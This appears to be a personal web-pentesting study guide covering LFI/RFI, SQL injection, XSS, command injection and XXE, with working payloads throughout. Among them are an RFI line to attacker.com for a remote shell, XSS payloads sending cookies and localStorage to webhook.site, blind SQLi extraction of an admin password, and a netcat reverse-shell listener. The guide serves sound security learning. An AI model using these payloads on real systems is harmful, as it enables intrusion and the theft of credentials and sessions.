
# File Inclusion
## Types :
1. Local File Inclusion (LFI) :
	- Allows an attacker to include files that are present in the target's server, it can result in reading sensitive files etc.
2. Remote File Inclusion (RFI) :
	- Allows an attacker to include files from external location, it can lead to code execution etc.

## Why it happens :
- Takes input from a user, and using that path to a file without properly validating it :
	e.g. : If an app allows language change, we can instead of sending Russian as input, we send `../../../` to achieve directory traversal, allowing us to travel back up to the root directory, and then appending `etc/passwd` to include the ***passwd file*** 
- Sometimes controls are put in place to prevent that from happening, but some controls such as `removing ../` if not done **recursively** may be ineffective.

## Basic Payloads :
1. LFI :
	- `etc/passwd`
	- `../../../etc/passwd` 
2. RFI :
	- `http://attacker.com/malicious.php`  //to execute a remote shell
- You can use `PHP wrappers` ( e.g. `php://filter` that allows us to read `php files` ) to bypass restrictions, Double encoding, recursive payloads ( adding a `../` between each `.<it goes here>./` ) etc.
- It's really good to know what language is being used server-side (PHP, JSP, ASP, etc.)
- We can also consider Fuzzing
- More payloads can be found in the `PayloadsAllTheThings` repo on `GitHub` 

# SQL injection

- One of the first thing we would do to check for SQLi is to test with `" and '` since they can break the SQL statement and return an `error`  .
- Next we would try `Logical operators` : `AND & OR` .
- Whenever you're thinking about SQLi, Also think about everything you're supplying to the application (headers, cookies etc.) and how it might be used : e.g. 
	- if the app automatically detects your browser, and says hey I suggest this plugin instead of this, you might think > Maybe it's using the `User-Agent:` and processing it in some way, and then you would suspect the user agent and start testing it.
	- Maybe it's the cookie, and so on.
## Terminators :
- `#` and `-- -`  (for MYSQL)  : It ends the SQL query, so anything after this gets ignored.
- Their syntax is different for each DB .

## UNION SELECT
- It let's us retrieve info from other tables and columns that were not initially defined.
- It has a constraint and it's that when we **UNION SELECT** we can **ONLY** select the same number in the original query. So if in the original query we're selecting let's say `username` and `password` well that's `2 columns` then we can only union select 2 items.
- To know the number of those columns we would use `null` , e.g. `jeremy' union select null-- -` and we keep incrementing the number of `null` till we get a normal response : `jeremy' union select null,null,null-- -` 
- One other constraint is that we can only select `1 type of data` so for example : 
	- Only integers or only strings etc. , if the data that we're trying to get (e.g. email > string and ID > integer ) we will get an ***Error*** 

## Some syntax
- Note : the syntax differs from a DB to another :
1. `version()` > _to get the version of the DB used
2.  `table_name from information_schema.tables` > _to get the table names from the DB
3.  `column_name from information_schema.columns` > _to get the column names 
- You can check *PORTSWIGGER* SQL cheat sheet for those diff syntax.

## sqlmap
- It's a tool that tests for SQLi > `sqlmap -r req.txt` or you can use a `url` instead, for more info enter the following command in the terminal : `sqlmap -h`
- To inject for some specific stuff like `cookies` you would need to increase the level to at least 2 > `--level=2`   

## BLIND SQLi
- It's called **Blind** since the : `query is only changing the behavior of the app, it won't give us back any data, it wonly only give us a change in behavior` 
- So we will have to create payloads that produce `true` `false` output, and based on the behavior, *we can slowly extract data* (e.g. is the first character of the password is `a` )

- The function we use to get the information is called : `substring`  and it's syntax is the following : `substr(string, start, length)` or `substr(string from start for length)` :
	  1. `' and substr("voidpacket", 1, 1) = "v"#`  > This should return `true` since the first `char` in the `string` is `v` .
	  2. `' and substr("voidpacket", 1, 3) = "voi"#`  > This should return `true` since the first `char` in the `string` is `voi` .
But here we don't want to use strings that we provide, we want strings provided by the DB, so our payload will look like this :
	3. `' and substr((select version()), 1, 1) = "8"#`
	4. `' and substr((select password from injection0x02 where username = 'admin'), 1, 1) = 'a'#`
- Remember that sometimes when comparing `Upper case letters` with `Lower Case Letters` can still return `true` .  
## SECOND ORDER SQLi
- The theory behind it is that you deliver your payload, but it only executes later, e.g. : 
	- Creating an account : username and password, but inject it with SQL payload, which will be stored in the DB and we can execute it later.
- `sqlmap` has an option for **Second Order SQL Testing** 

# Cross-Site Scripting (XSS)
- It's a vulnerability that let's us executes JavaScript code in a victim's browser, and often gives us control over the app for that user.
## Types :
1. ***Reflected*** > When the script we're injecting comes from the current HTTP request : `our script is included in the request` 
	- It's limiting since we can only target ourselves
2. ***Stored*** > When the payload is stored in the DB or something and then we can retrieve it later.
3. ***DOM-Based*** > When the client-side has some vulnerable JavaScript that uses untrusted input  instead of having a vulnerability serve-side
	- Everything happens locally in the browser : so when you take a look at the `Network` section in the dev tools, and you send your payload, the page doesn't get refreshed.

## Testing 
- It's better to test for `HTML injection` first, since if it works `XSS injection` will work.
- It's better to not use `alert()` as it often gets filtered, instead use : `print()` > which will pop up a print box. or `prompt()` > which will pop up a prompt box.
- We can also use `A to B testing` to test for stored XSS : it's helpful to use containers ( the best method in my opinion is using the [Firefox multi-account containers](https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/)). 
###  Very Basic payloads :
- `<script>prompt(1)</script>`
- `<img src=x onerror=prompt()>`
- `<img src=x onerror="window.location.href = '<evil.com>'"`
- To get for example another user's or admin's cookie we can use a webhook :
	1. Use `netcat`, `collaborator` in burp or a website like `webhook.site` to receive the response. Just know that we should not be using third party websites if we're doing `bugbounty or pentest`, instead we can use a `ec2 instance` or if we're `using vpn we can just use our local machine`
	
	2. Syntax vary when it come to advanced Payloads : this is a payload that i used in a CTF challenge in one of my favorite platforms : [BugForge](https://bugforge.io/) , you can find the full documentation on my [Labs-Documentation](https://github.com/VOIDPACKET-VP/Labs-Documentation/blob/main/bugForge/Stored%20Cross-Site%20Scripting%20(XSS)%20to%20Account%20Takeover.md) repo : 
		- `<img src=x onerror="fetch('https://webhook.site/YOUR-ID?test=execute&cookie='+encodeURIComponent(document.cookie)+'&localStorage='+encodeURIComponent(JSON.stringify(localStorage)));" `
		- `<script>var i = new Image; i.src = "https://webhook.site/YOUR-ID/?"+ document.cookie;</script>`
- Obviously learning `JavaScript` is very important if you want to level up your payload crafting skills, some of the best resources to learn it are : [Scrimba](https://scrimba.com/t0js) , [JavaScript Mastery](https://jsmastery.com) etc.
- More can be found in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) repo and [HackTricks](https://book.hacktricks.wiki/en/index.html)
# Command Injection (OS)
- It's a very serious vulnerability, if we find it we can often compromise the entire application and the host.
## Why it happens
- The app is taking user input and passing it to a function that executes it as code, one of those functions are : `eval()` _eval is evil_ .

## Testing
- When we think about command injection, we think about :
	1. Can we chain commands ?
	2. Is the command that's being used where our code is being appended, can we add something that gets executed ?

## Basic payloads
- `; whoami` 
- `which php` //to check what PHP version is being used
- `ls||id; ls ||id; ls|| id; ls || id` 
- We can also add `#` to comment out what comes after our code > `; whoami ;#` 
- You can find some `Reverse shell paylaods` on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) and [HackTricks](https://book.hacktricks.wiki/en/index.html), just know that you will need a listener : use `netcat` > `nc -nvlp <PORT>` .
- NOTE THAT : ***Popping a shell*** is most of the times **OUT OF SCOPE** in bug bounties > so check the scope and rules of engagements of the program you're working on. 

## Blind Command Injection
- As every blind injection : we inject our code but the result don't get reflected back to us, so we can use some different payloads to test for it:
	- `"sleep 10"`
	- `https://webhook.site/YOUR-ID?q="<code-to-execute (e.g. sleep 10)>"` 


# Server-Side Template Injection (SSTI)
- So a template engine allows us to separate the ***Presentation Layer*** from the ***Logic Layer*** in our application.
- Some popular template engines are :
	1. Ginger2
	2. Twig
	3. Erb
	4. Free Marker
	5. etc.

- ***NOTE*** : I've made a more deep guide on SSTI which i highly recommend you to check and read > [SSTI Solar Flares](https://github.com/VOIDPACKET-VP/VOIDPACKET-Web-Galaxies/blob/main/Cosmic%20Phenomena/SSTI%20Solar%20Flares.md), Since i won't be going over it here. THANK YOU.

# XML External Entity injection (XXE)

- Some apps use XML to transfer data. This format has a specification that contains potentially dangerous features and parsers that process the data vulnerably.
- An external entity is a custom entity whose definition is outside the document and therefore needs to be located when the XML file is passed.
- This is not something that we find often anymore, since teams have added patches and filters etc. but it's worth testing for if an app is accepting and passing XML.
- Sometimes API endpoints might except XML data instead of JSON, situations like this are often overlooked and therefore greater bounty rewards.

## Basic payloads :
- `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`

# Insecure File Uploads
- 